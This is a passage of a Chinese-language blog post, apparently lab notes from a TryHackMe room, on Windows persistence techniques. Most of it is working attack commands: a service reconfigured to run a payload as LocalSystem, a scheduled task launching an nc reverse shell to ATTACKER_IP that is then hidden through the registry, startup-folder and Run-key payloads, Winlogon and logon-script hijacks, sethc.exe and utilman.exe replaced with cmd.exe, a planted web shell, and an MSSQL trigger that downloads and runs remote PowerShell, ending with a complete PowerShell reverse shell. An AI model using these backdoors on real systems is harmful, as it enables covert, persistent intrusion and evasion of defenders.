+<li>服务START_TYPE应该是自动的，以便有效负载无需用户交互即可运行。</li>
+<li>SERVICE_START_NAME（即运行服务的帐户）最好设置为 LocalSystem 以获得 SYSTEM 权限。</li>
+</ul>
+<p>重新配置服务</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\&gt; sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"</span></span></code></pre>
+<p>检查服务配置</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\&gt; sc.exe qc THMservice3</span></span>
+<span class="line"><span>[SC] QueryServiceConfig SUCCESS</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>SERVICE_NAME: THMservice3</span></span>
+<span class="line"><span>        TYPE               : 10  WIN32_OWN_PROCESS</span></span>
+<span class="line"><span>        START_TYPE         : 2   AUTO_START</span></span>
+<span class="line"><span>        ERROR_CONTROL      : 1   NORMAL</span></span>
+<span class="line"><span>        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe</span></span>
+<span class="line"><span>        LOAD_ORDER_GROUP   :</span></span>
+<span class="line"><span>        TAG                : 0</span></span>
+<span class="line"><span>        DISPLAY_NAME       : THMservice3</span></span>
+<span class="line"><span>        DEPENDENCIES       :</span></span>
+<span class="line"><span>        SERVICE_START_NAME : LocalSystem</span></span></code></pre>
+<h2 id="task-scheduler">Task Scheduler</h2>
+<p>使用计划任务来维持权限</p>
+<p>创建一个计划任务，每分钟运行一次</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\&gt; schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM</span></span></code></pre>
+<p>检查计划任务是否成功创建</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\&gt; schtasks /query /tn thm-taskbackdoor</span></span></code></pre>
+<p>隐藏计划任务，所有计划任务的安全描述符都存储在 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\</code> 中。您将找到每个任务的注册表项，在该注册表项下，名为“SD”的值包含安全描述符。只有在您拥有 SYSTEM 权限时，才能擦除该值。</p>
+<p>可以使用 <code>PsExec64.exe -s -i regedit</code> 来提升权限
+<img alt="Pasted-image-20231126150553.png" loading="lazy" decoding="async" width="755" height="459" src="/_astro/Pasted-image-20231126150553.Cg0kEGJJ_15OUaC.webp" srcset=""></p>
+<p>再次搜索时，系统会告诉没有这个计划任务</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\&gt; schtasks /query /tn thm-taskbackdoor</span></span></code></pre>
+<h2 id="startup-folder">Startup folder</h2>
+<p>开机启动文件夹，登录触发</p>
+<blockquote>
+<p>用户级: <code>C:\Users\&lt;your_username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>
+系统级: <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code></p>
+</blockquote>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\&gt; copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"</span></span></code></pre>
+<h2 id="run--runonce">Run / RunOnce</h2>
+<p>通过注册表操作开机启动项</p>
+<ul>
+<li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
+<li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
+<img alt="Pasted-image-20231128151208.png" loading="lazy" decoding="async" width="812" height="271" src="/_astro/Pasted-image-20231128151208.f8ApXPHf_1FipDu.webp" srcset=""></li>
+</ul>
+<h2 id="winlogon-组件">WinLogon 组件</h2>
+<p>Winlogon 使用一些注册表 <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code></p>
+<ul>
+<li><code>Userinit</code> 指向 <code>userinit.exe</code> ，它负责恢复您的用户配置文件首选项</li>
+<li><code>shell</code> 指向系统的 shell，通常 <code>explorer.exe</code> 为 。
+修改其一实现权限维持
+<img alt="Pasted-image-20231130095914.png" loading="lazy" decoding="async" width="823" height="232" src="/_astro/Pasted-image-20231130095914.DOq19d8A_1lJ0FW.webp" srcset=""></li>
+</ul>
+<h2 id="logon-scripts">Logon scripts</h2>
+<p>加载用户配置文件时要做的一件事是 <code>userinit.exe</code> 检查名为 <code>UserInitMprLogonScript</code> 的环境变量。我们可以使用此环境变量将登录脚本分配给用户，该脚本将在登录计算机时运行。默认情况下没有设置该变量，因此我们可以创建它并分配我们喜欢的任何脚本。
+<img alt="Pasted-image-20231130100300.png" loading="lazy" decoding="async" width="823" height="232" src="/_astro/Pasted-image-20231130100300.CtaeWOBN_ZrGTBV.webp" srcset="">
+若要为用户创建环境变量，可以在注册表中转到该 <code>HKCU\Environment</code> 变量。我们将使用该 <code>UserInitMprLogonScript</code> 条目指向我们的有效负载，以便在用户登录时加载它。</p>
+<h2 id="rdp-后门">RDP 后门</h2>
+<p>如果我们对计算机（在本例中为 RDP）具有物理访问权限，则可以在登录屏幕后门访问终端，而无需计算机的有效凭据。</p>
+<ul>
+<li>Sticky Keys 粘滞键 - <code>c:\Windows\System32\sethc.exe</code></li>
+<li>Utilman 优蒂曼 - <code>C:\Windows\System32\Utilman.exe</code></li>
+<li>放大镜、对比度主题、屏幕键盘…</li>
+</ul>
+<p>首先获取文件权限，然后才能替换为 cmd.exe</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\&gt; takeown /f c:\Windows\System32\sethc.exe</span></span>
+<span class="line"><span>C:\&gt; takeown /f c:\Windows\System32\utilman.exe</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>C:\&gt; icacls C:\Windows\System32\sethc.exe /grant Administrator:F</span></span>
+<span class="line"><span>C:\&gt; icacls C:\Windows\System32\utilman.exe /grant Administrator:F</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>C:\&gt; copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe</span></span>
+<span class="line"><span>c:\&gt; copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe</span></span></code></pre>
+<h2 id="using-web-shells">Using Web Shells</h2>
+<p>在 Web 服务器中实现持久性的常用方法是将 Web Shell 上传到 Web 目录。这是微不足道的，它将授予我们以 IIS 中配置用户的权限访问，默认情况下为 <code>iis apppool\defaultapppool</code> .即使这是一个非特权用户，它也有特殊的 <code>SeImpersonatePrivilege</code> ，提供了一种使用各种已知漏洞升级给管理员的简单方法</p>
+<p>默认情况下，webroot 位于以下 <code>C:\inetpub\wwwroot</code> 目录中</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\&gt; move shell.aspx C:\inetpub\wwwroot\</span></span>
+<span class="line"><span>C:\&gt; icacls shell.aspx /grant Everyone:F</span></span></code></pre>
+<h2 id="using-mssql-as-a-backdoor">Using MSSQL as a Backdoor</h2>
+<p>有几种方法可以在MSSQL Server安装中植入后门程序，比如滥用触发器。MSSQL中的触发器允许绑定当数据库中发生特定事件时要执行的操作。这些事件的范围可以从用户登录到从给定表中插入、更新或删除数据。，现在为 <code>HRDB</code> 数据库中的任何 INSERT 创建一个触发器。</p>
+<p>首先启用 <code>xp_cmdshell</code>，打开一个 MSSQL Shell
+<img alt="Pasted-image-20231130103209.png" loading="lazy" decoding="async" width="623" height="103" src="/_astro/Pasted-image-20231130103209.U4kbNybm_1G4xe.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">sp_configure </span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'Show Advanced Options'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">1</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">RECONFIGURE</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">GO</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">sp_configure </span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'xp_cmdshell'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">1</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">RECONFIGURE</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">GO</span></span></code></pre>
+<p>默认情况下，只有具有该角色的 <code>sysadmin</code> 数据库用户才能执行此操作。为了让所有访问数据库的网站都可以运行 <code>xp_cmdshell</code> ，向所有用户授予模拟数据库管理员 <code>sa</code> 用户的权限。</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">USE</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> master</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">GRANT</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> IMPERSONATE </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">ON</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> LOGIN</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">::sa </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">to</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> [Public]</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span></code></pre>
+<p>配置了一个触发器。我们首先切换到 <code>HRDB</code> 数据库：</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">USE</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> HRDB</span></span></code></pre>
+<p>触发器将利用 <code>xp_cmdshell</code> 执行 Powershell 从攻击者控制的 Web 服务器下载并运行 <code>.ps1</code> 文件。触发器将配置为在 <code>HRDB</code> 数据库 <code>Employees</code> 表中执行： <code>INSERT</code></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">CREATE</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> TRIGGER </span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">[sql_backdoor]</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">ON</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> HRDB</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">dbo</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.Employees </span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">FOR</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> INSERT</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> AS</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">EXECUTE</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> AS</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> LOGIN</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> 'sa'</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">EXEC</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> master</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">..xp_cmdshell </span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:80/shell.ps1'')"'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span></code></pre>
+<p>现在后门已经设置好了，让我们 <code>evilscript.ps1</code> 在攻击者的机器中创建，其中将包含一个 Powershell 反向 shell：</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$client</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> New-Object</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> System.Net.Sockets.TCPClient(</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"ATTACKER_IP"</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">4454</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$stream</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $client.GetStream</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">();</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">byte</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">[]]</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$bytes</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> 0</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">..</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">65535</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">|</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">%</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">{</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">0</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">};</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">while</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">((</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$i</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $stream.Read</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$bytes</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> 0</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">,</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $bytes.Length</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)) </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">-ne</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> 0</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">){</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">    $data</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> (</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">New-Object</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">TypeName System.Text.ASCIIEncoding).GetString(</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$bytes</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">0</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">,</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $i</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">);</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">    $sendback</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> (iex </span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$data</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> 2&gt;&amp;1</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> |</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> Out-String</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> );</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">    $sendback2</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $sendback</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> +</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "PS "</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> +</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> (pwd).Path </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">+</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "&gt; "</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">    $sendbyte</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> ([</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">text.encoding</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">]::ASCII).GetBytes(</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$sendback2</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">);</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">    $stream.Write</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$sendbyte</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">0</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">,</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$sendbyte.Length</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">);</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">    $stream.Flush</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">()</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$client.Close</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">()</span></span></code></pre>
+<p>现在只需开启 HTTP 服务，然后插入数据触发即可。</p>
+</div></div><aside class="toc" data-toc hidden aria-label="目录" data-astro-cid-sgg5joot><p class="toc-label" data-astro-cid-sgg5joot>目录</p><nav class="toc-nav" data-toc-nav data-astro-cid-sgg5joot></nav></aside></div></article></main><footer data-astro-cid-jo6i4kqk><div class="inner" data-astro-cid-jo6i4kqk><p class="line" data-astro-cid-jo6i4kqk>© 2026 Zumpyx</p><p class="note" data-astro-cid-jo6i4kqk>notes · exploit · write · repeat</p></div></footer><script type="module">function e(e){return e.trim().toLowerCase().replace(/\s+/g,`-`).replace(/[^\w\u4e00-\u9fff-]+/g,``).replace(/-+/g,`-`).replace(/^-|-$/g,``)||`section`}var t=null;function n(){let n=document.querySelector(`[data-article-content]`),r=document.querySelector(`[data-toc]`),i=document.querySelector(`[data-toc-nav]`);if(!n||!r||!i)return;t?.disconnect(),t=null,i.replaceChildren();let a=Array.from(n.querySelectorAll(`h2, h3`)).filter(e=>(e.textContent??``).trim().length>0);if(a.length===0){r.hidden=!0;return}r.hidden=!1;let o=new Set,s=[];for(let t of a){let n=t.id;if(!n){let r=e(t.textContent??``);n=r;let i=2;for(;o.has(n)||document.getElementById(n);)n=`${r}-${i}`,i+=1;t.id=n}o.add(n);let r=document.createElement(`a`);r.href=`#${n}`,r.textContent=(t.textContent??``).trim(),r.className=t.tagName===`H3`?`toc-h3`:`toc-h2`,r.dataset.target=n,i.appendChild(r),s.push(r)}let c=e=>{for(let t of s)t.classList.toggle(`active`,t.dataset.target===e)};t=new IntersectionObserver(e=>{let t=e.filter(e=>e.isIntersecting).sort((e,t)=>e.target.offsetTop-t.target.offsetTop);t[0]&&c(t[0].target.id)},{rootMargin:`-15% 0px -70% 0px`,threshold:[0,1]});for(let e of a)t.observe(e);location.hash?c(decodeURIComponent(location.hash.slice(1))):a[0]&&c(a[0].id)}n(),document.addEventListener(`article-content-unlocked`,()=>{n()});</script></body></html>
